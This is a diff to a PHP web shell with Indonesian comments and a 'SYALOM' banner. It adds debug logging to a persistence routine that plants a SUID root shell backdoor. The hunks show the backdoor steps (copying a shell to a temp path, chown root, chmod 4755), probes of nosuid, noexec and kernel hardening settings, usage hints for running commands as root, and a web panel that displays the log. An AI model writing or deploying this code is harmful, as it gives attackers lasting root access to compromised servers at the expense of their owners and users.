@@ -3020,12 +3020,23 @@ function install_persistence_mechanisms() {
     // 🎯 SUID BACKDOOR - Untuk Interactive Root Terminal
     // Hanya bisa dibuat jika kita sudah punya root access
     
+    // ====== DETAILED DEBUGGING ======
+    $debug_log = [];
+    $debug_log[] = "=== SUID BACKDOOR DEBUG LOG ===";
+    $debug_log[] = "Timestamp: " . date('Y-m-d H:i:s');
+    $debug_log[] = "Current user (id): " . execute_shell_command("id 2>&1");
+    $debug_log[] = "Current user (whoami): " . execute_shell_command("whoami 2>&1");
+    $debug_log[] = "EUID: " . execute_shell_command("id -u 2>&1");
+    
     // Cek apakah /tmp memiliki nosuid mount option
-    $mount_check = execute_shell_command("mount | grep 'on /tmp' 2>/dev/null || echo 'NO_TMP_MOUNT'");
+    $mount_check = execute_shell_command("mount | grep -E '(on /tmp|on /var/tmp|on /dev/shm)' 2>/dev/null || echo 'NO_TMP_MOUNT'");
+    $debug_log[] = "Mount check:\n$mount_check";
     $tmp_nosuid = (strpos($mount_check, 'nosuid') !== false);
+    $tmp_noexec = (strpos($mount_check, 'noexec') !== false);
     
     // Cek kernel parameters yang mungkin blok SUID
-    $kernel_protection = execute_shell_command("sysctl fs.protected_regular fs.suid_dumpable 2>/dev/null || echo 'UNKNOWN'");
+    $kernel_protection = execute_shell_command("sysctl fs.protected_regular fs.suid_dumpable kernel.yama.ptrace_scope 2>/dev/null || echo 'UNKNOWN'");
+    $debug_log[] = "Kernel protection:\n$kernel_protection";
     
     // Pilih lokasi berdasarkan mount options
     if ($tmp_nosuid) {
@@ -3047,21 +3058,31 @@ function install_persistence_mechanisms() {
         foreach ($shell_sources as $shell) {
             if (!file_exists($shell)) continue;
             
+            $debug_log[] = "--- Trying: $try_path (source: $shell) ---";
+            
             // Step 1: Copy shell
             $copy_result = execute_shell_command("cp $shell $try_path 2>&1");
+            $debug_log[] = "Step 1 (cp): $copy_result";
             
             // Step 2: Set owner to root (hanya work kalau root)
             $chown_result = execute_shell_command("chown root:root $try_path 2>&1");
+            $debug_log[] = "Step 2 (chown): $chown_result";
             
             // Step 3: Set SUID bit
             $chmod_result = execute_shell_command("chmod 4755 $try_path 2>&1");
+            $debug_log[] = "Step 3 (chmod): $chmod_result";
             
             // Step 4: Verify
-            $verify_result = execute_shell_command("ls -la $try_path 2>&1 && stat $try_path 2>&1 | grep -E 'Uid|Access|File'");
+            $verify_result = execute_shell_command("ls -la $try_path 2>&1");
+            $stat_result = execute_shell_command("stat $try_path 2>&1");
+            $debug_log[] = "Step 4 (ls -la): $verify_result";
+            $debug_log[] = "Step 4 (stat): $stat_result";
             
             // Check apakah benar-benar SUID + root owned
             $has_suid = (strpos($verify_result, 'rws') !== false || strpos($verify_result, 'rwxs') !== false);
             $has_root_owner = (strpos($verify_result, 'root root') !== false || strpos($verify_result, 'Uid: ( 0/') !== false);
+            $debug_log[] = "Has SUID bit: " . ($has_suid ? 'YES' : 'NO');
+            $debug_log[] = "Has root owner: " . ($has_root_owner ? 'YES' : 'NO');
             
             if ($has_suid && $has_root_owner) {
                 $suid_created = true;
@@ -3097,6 +3118,9 @@ function install_persistence_mechanisms() {
         }
     }
     
+    // Add debug log to results
+    $debug_output = implode("\n", $debug_log);
+    
     if ($suid_created && ($suid_test === 'VERIFIED_WORKING' || $suid_test === 'VERIFIED_WORKING_PFLAG')) {
         $p_flag = ($suid_test === 'VERIFIED_WORKING_PFLAG') ? ' -p' : '';
         $results['suid_backdoor'] = [
@@ -3105,7 +3129,8 @@ function install_persistence_mechanisms() {
             'source' => $suid_source,
             'description' => 'SUID ROOT SHELL - Working!',
             'how_to_use' => "$suid_path$p_flag -c 'command'",
-            'note' => 'Use: ' . $suid_path . ' -c "id" to run as root'
+            'note' => 'Use: ' . $suid_path . ' -c "id" to run as root',
+            'debug_log' => $debug_output
         ];
     } elseif ($suid_created) {
         $results['suid_backdoor'] = [
@@ -3114,16 +3139,18 @@ function install_persistence_mechanisms() {
             'source' => $suid_source,
             'description' => 'SUID binary created but NOT WORKING',
             'how_to_use' => 'May require kernel exploit to be active',
-            'note' => 'Created at: ' . $suid_path . ' but test failed. Kernel protections: ' . substr($kernel_protection, 0, 200),
+            'note' => 'Created at: ' . $suid_path . ' but test failed. Check debug_log for details.',
             'test_output' => $test_details,
-            'ls_output' => $suid_details
+            'ls_output' => $suid_details,
+            'debug_log' => $debug_output
         ];
     } else {
         $results['suid_backdoor'] = [
             'status' => 'failed',
             'description' => 'SUID ROOT SHELL - Failed to create',
             'how_to_use' => 'Need root access',
-            'note' => 'Root required. /tmp nosuid: ' . ($tmp_nosuid ? 'YES' : 'NO') . '. Kernel: ' . substr($kernel_protection, 0, 100)
+            'note' => 'Root required. /tmp nosuid: ' . ($tmp_nosuid ? 'YES' : 'NO') . '. /tmp noexec: ' . ($tmp_noexec ? 'YES' : 'NO'),
+            'debug_log' => $debug_output
         ];
     }
     
@@ -3496,7 +3523,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 290326 1718</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 290326 1843</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -7236,6 +7263,14 @@ function installPersistence() {
                     
                     if (info.method) {
                         html += '<p style="color:#888;margin:5px 0;font-size:11px;">⚙️ <strong>Method:</strong> ' + info.method + '</p>';
+                    }
+                    
+                    // Show debug log for suid_backdoor if available
+                    if (method === 'suid_backdoor' && info.debug_log) {
+                        html += '<div style="margin-top:10px;">';
+                        html += '<p style="color:#6cf;margin:5px 0;font-size:11px;">🔍 <strong>Debug Log:</strong></p>';
+                        html += '<textarea readonly style="width:100%;height:200px;background:#000;color:#888;border:1px solid #333;padding:8px;font-family:monospace;font-size:10px;resize:vertical;overflow:auto;">' + escapeHtml(info.debug_log) + '</textarea>';
+                        html += '</div>';
                     }
                     
                     html += '</div>';
